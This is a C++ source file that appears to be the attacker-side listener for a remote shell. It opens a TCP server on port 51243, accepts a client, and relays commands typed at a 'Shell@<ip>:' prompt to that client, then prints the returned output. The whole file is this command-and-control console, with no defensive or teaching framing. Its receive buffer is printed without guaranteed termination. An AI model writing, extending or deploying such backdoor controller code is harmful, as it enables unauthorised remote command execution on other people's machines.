#include <iostream>
#include <tuple>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>

constexpr int SERVER_PORT = 51243;

class SocketServer {
private:
    int                 _socket_id;

public:
    SocketServer():
        _socket_id {0} {

        this->_socket_id =socket(AF_INET, SOCK_STREAM, 0);

        int option_value = 1;
        if (setsockopt(this->_socket_id,
                        SOL_SOCKET,
                        SO_REUSEADDR,
                        &option_value,
                        sizeof(option_value)) < 0) {
            std::cout << "Failed to setup socket options." << std::endl;
        }

        struct sockaddr_in server_address = {0};
        server_address.sin_family = AF_INET;
        server_address.sin_port = htons(SERVER_PORT);
        bind(this->_socket_id,
                (struct sockaddr *)&server_address,
                sizeof(server_address));
        listen(this->_socket_id, 10);
    }

    std::tuple<int, std::string> Accept() {
        struct sockaddr_in client_address = {0};
        int client_socket_id = 0;
        int client_address_length = sizeof(client_address);
        client_socket_id = accept(this->_socket_id,
                                    (struct sockaddr *)&client_address,
                                    (socklen_t *)&client_address_length);
        return {client_socket_id, std::string(inet_ntoa(client_address.sin_addr))};
    }

    int Receive(int client_id, char *buffer, int length) {
        return recv(client_id, buffer, length, MSG_WAITALL);
    }

    int Send(int client_id, const char *buffer, int length) {
        return send(client_id, buffer, length, 0);
    }

    ~SocketServer() {
        close(this->_socket_id);
    }
};

class Server {
private:
    SocketServer _server;

public:
    Server(): _server{} {}

    void Run() {
        while (true)
        {
            std::tuple<int, std::string> client = this->_server.Accept();
            if (std::get<0>(client) > 0) {
                while (true) {
                    std::string command{};
                    int res = 0;
                    std::cout << "Shell@" << std::get<1>(client) <<": ";

                    std::getline(std::cin, command);
                    if (command.size() == 0) {
                        continue;
                    }

                    res = this->_server.Send(std::get<0>(client),
                                            command.c_str(),
                                            command.size());

                    if (res >= 0) {
                        char command_output[20480] = {0};
                        res = this->_server.Receive(std::get<0>(client),
                                                    command_output,
                                                    sizeof(command_output));
                        if ( res >= 0) {
                            std::cout << command_output << std::endl;
                        } else {
                            break;
                        }
                    } else {
                        break;
                    }
                }
            }
        }
    }

    ~Server() {}
};

int main() {
    Server server {};
    server.Run();
}
